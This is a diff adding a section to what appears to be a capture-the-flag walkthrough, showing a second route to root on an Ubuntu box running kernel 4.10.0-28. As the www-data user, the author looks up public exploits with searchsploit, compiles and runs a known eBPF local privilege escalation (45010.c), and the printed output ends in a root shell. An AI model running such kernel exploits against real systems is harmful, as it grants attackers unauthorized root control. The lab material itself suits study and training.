@@ -430,9 +430,46 @@ cat root.txt
 b2b17036da1de94cfb024540a8e7075a
 
 
+Privilage Escalation 2 (using kernel exploit) :
+==============================================
 
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ uname -a
+Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 
+$ searchsploit ubuntu 4.10.0
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                               |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                         | linux/dos/43234.c
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                | linux/local/45010.c
+Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                       | linux/local/41760.txt
 
+www-data@ubuntu:/tmp$ gcc 45010.c -o expl
+gcc 45010.c -o expl
+
+www-data@ubuntu:/tmp$ ./expl
+./expl 
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff8ed8f8fe5500
+[*] Leaking sock struct from ffff8ed8c90adc00
+[*] Sock->sk_rcvtimeo at offset 592
+[*] Cred structure at ffff8ed8f6d4a900
+[*] UID from cred structure: 33, matches the current: 33
+[*] hammering cred structure at ffff8ed8f6d4a900
+[*] credentials patched, launching shell...
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
 
 
 
